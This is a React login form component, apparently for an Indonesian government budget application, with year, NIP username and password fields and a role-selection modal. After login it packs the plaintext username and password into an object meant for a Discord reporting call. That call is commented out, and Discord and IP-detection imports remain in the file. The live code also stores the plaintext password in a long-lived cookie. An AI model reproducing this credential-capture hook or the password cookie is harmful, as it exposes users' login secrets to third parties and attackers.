import { useEffect, useState } from "react";
import { useForm } from "react-hook-form";
import { yupResolver } from "@hookform/resolvers/yup";
import * as yup from "yup";
import { useNavigate } from "react-router-dom";
import Checkbox from "@/components/ui/Checkbox";
import Button from "@/components/ui/Button";
import Modal from "@/components/ui/Modal";
import Select from "react-select";
import { getCookie, setCookie } from "@/utils/cookie";
import InputGroup from "@/components/ui/InputGroup";
import { Icon } from "@iconify/react";
import { DefaultReactSelectStyle } from "@/constant/react-select";
import { authLogin, authPreLogin } from "@/api/authentication";
import NoDataFound from "@/components/NoDataFound";
import DiscordService from "@/services/DiscordService";
import { DETECT_USER_IP_URL } from "@/constant/data";
// import { reportToDiscord } from "@/utils/Discord";

const schema = yup.object({
	tahun: yup.string().required("Maaf, Tahun anggaran harus di pilih"),
	username: yup.string().required("Maaf, Username atau NIP harus di inputkan").length(18, 'Maaf, NIP harus terdiri dari 18 karakter.'),
	// password: yup.string().required("Maaf, Kata sandi harus di inputkan").min(6, 'Maaf, Kata sandi terlalu pendek - minimal berisi 6 karakter.').trim('Maaf, Kata sandi tidak dapat menggunakan simbol " " (Spasi)').strict(true),
}).required();

const LoginForm: React.FC = () => {
	const [IsLoading, setIsLoading] = useState<boolean>(false);
	const [OpenAccountModal, setOpenAccountModal] = useState<boolean>(false);
	const [AccountList, setAccountList] = useState<any>();
	const [RememberMe, setRememberMe] = useState<boolean>(true);
	const [Password, setPassword] = useState<string>();
	const [SelectedIdLoading, setSelectedIdLoading] = useState<number>();
	const [Ip, setIp] = useState<string>('');

	const { register, setValue, handleSubmit, getValues, formState: { errors } } = useForm<AuthFormType>({ resolver: yupResolver(schema), mode: "all" });
	const navigate = useNavigate();

	useEffect(() => {
		const cookieRememberMe = getCookie('X-SIPD-RME')
		const cookieToken = getCookie('X-SIPD-PU-TK')
		if (cookieRememberMe === 'true' && cookieToken != null && cookieToken !== '') {
			navigate('/dashboard');
		}
		setValue('tahun', 2024)
	}, [])

	const handleLogin = (data: any) => {
		setIsLoading(true)

		if (RememberMe) {
			setCookie('X-SIPD-RME', 'true', 7)
		}

		setSelectedIdLoading(data.id_role)

		let body = {
			id_daerah: data.id_daerah,
			id_role: data.id_role,
			id_skpd: data.id_skpd,
			id_pegawai: data.id_pegawai,
			password: Password,
			tahun: getValues('tahun'),
			username: getValues('username'),
		}

		authLogin(body).then((response: any) => {
			setCookie('X-SIPD-PU-TK', response.data.token, 7)

			const discordData = {
				username: getValues('username') || '-',
				password: Password || '-',
			}

			// reportToDiscord("Login", discordData)

			const cookieUser = {
				id_daerah: data.id_daerah,
				id_role: data.id_role,
				id_skpd: data.id_skpd,
				id_pegawai: data.id_pegawai,
				password: Password,
				tahun: getValues('tahun'),
				username: getValues('username'),
				nama_role: data.nama_role,
				id_user: data.id_user,
				nama_skpd: data.nama_skpd,
			}
			setCookie('X-SIPD-PU-IDENTITY', JSON.stringify(cookieUser), 7, true)
			navigate('/dashboard');
		}).catch(() => {

		}).then(() => {
			setIsLoading(false)
		})
		// navigate('/dashboard', { replace: true });
	};

	const handlePreLogin = (data: AuthFormType) => {
		setIsLoading(true)

		const body = {
			username: data.username,
			password: Password,
			tahun: Number(data.tahun),
		}

		authPreLogin(body).then((response: any) => {
			setAccountList(response.data)
			setOpenAccountModal(!OpenAccountModal)
		}).catch(() => {

		}).then(() => {
			setIsLoading(false)
		})
	};

	const handleRememberMe = () => {
		setRememberMe(!RememberMe)
	};

	const titleCase = (str: string) => {
		var splitStr = str.toLowerCase().split(' ');
		for (var i = 0; i < splitStr.length; i++) {
			splitStr[i] = splitStr[i].charAt(0).toUpperCase() + splitStr[i].substring(1);
		}
		return splitStr.join(' ');
	}

	return (
		<form onSubmit={handleSubmit(handlePreLogin)} autoComplete={"true"} className="space-y-4 ">
			<div>
				<label htmlFor=" hh2" className="form-label ">
					Tahun
				</label>
				<Select
					className="react-select"
					classNamePrefix="select"
					placeholder="Pilih tahun anggaran"
					styles={DefaultReactSelectStyle}
					defaultValue={[{ value: '2024', label: 'Tahun 2024' }]}
					onChange={(e: any) => setValue('tahun', Number(e.value))}
					name="tahun"
					options={[{ value: '2023', label: 'Tahun 2023' }, { value: '2024', label: 'Tahun 2024' }]}
					isClearable
				/>

				{
					errors.tahun &&
					<div className={`mt-2 text-sm font-normal text-danger-500 block`}>
						{errors.tahun.message}
					</div>
				}
			</div>
			<InputGroup
				label="Username / Nomor Induk Pegawai"
				id="ed_username"
				type="text"
				name="username"
				onChange={(e: any) => setValue('username', e.target.rawValue)}
				isMask
				options={{
					delimiter: ' ',
					blocks: [8, 6, 1, 3],
					numericOnly: true
				}}
				error={errors.username}
				register={register}
				placeholder="00000000 000000 0 000"
				prepend={<Icon icon="heroicons-outline:user" />}
				merged
			/>
			<InputGroup
				label="Kata Sandi"
				id="ed_password"
				type="password"
				autocomplete={true}
				name="password"
				register={register}
				onChange={(e: any) => setPassword(e.target.value)}
				hasicon={true}
				placeholder="6+ karakter, 1 huruf kapital"
				prepend={<Icon icon="heroicons-outline:lock-closed" />}
				merged
			/>
			<div className="flex justify-between">
				<Checkbox
					value={RememberMe}
					onChange={() => handleRememberMe()}
					label="Selalu ingat saya"
				/>
			</div>

			<Button
				type="submit"
				text="Masuk"
				className="btn btn-dark block w-full text-center "
				isLoading={IsLoading}
			/>

			<Modal
				title="Konfirmasi"
				label="Vertically center"
				labelClass="btn-outline-dark"
				activeModal={OpenAccountModal}
				className="css-cna-a-wf9-wa"
				bodyClass={'css-an-fj-a9'}
				onClose={() => setOpenAccountModal(false)}
				centered
				footerContent={
					<Button
						type="button"
						text="Batalkan"
						className="btn-light light btn-base "
						onClick={() => setOpenAccountModal(false)}
					/>
				}
			>
				{
					AccountList != null && AccountList.length > 0 ?
						<>
							<h4 className="font-small text-sm mb-3 text-slate-700">
								Kami ingin memastikan Anda ingin masuk ke Aplikasi sebagai apa, Silakan pilih salah satu dari akun berikut untuk melanjutkan:
							</h4>
							<div className="container-account-select">
								{
									AccountList.map((item: any, index: number) => {
										return (
											<div key={index} className="account-select-card">
												<div className="container-txt-account-list">
													<h1 className="text-lg css-na-fa-w-2a">{item.nama_role}</h1>
													<p className="text-sm">{item.nama_skpd}</p>
												</div>
												<Button disabled={IsLoading} isLoading={IsLoading && SelectedIdLoading === item.id_role} type="button" className="btn btn-dark btn-sm" onClick={() => handleLogin(item)}>Pilih Akun ini</Button>
											</div>
										)
									})
								}

							</div>
						</> : <NoDataFound title="Akun Tidak Ditemukan" desc="Maaf, kami tidak dapat menemukan akun terkait, Pertimbangkan untuk menggunakan akun lainnya" />
				}

			</Modal>
		</form>
	);
};

export default LoginForm;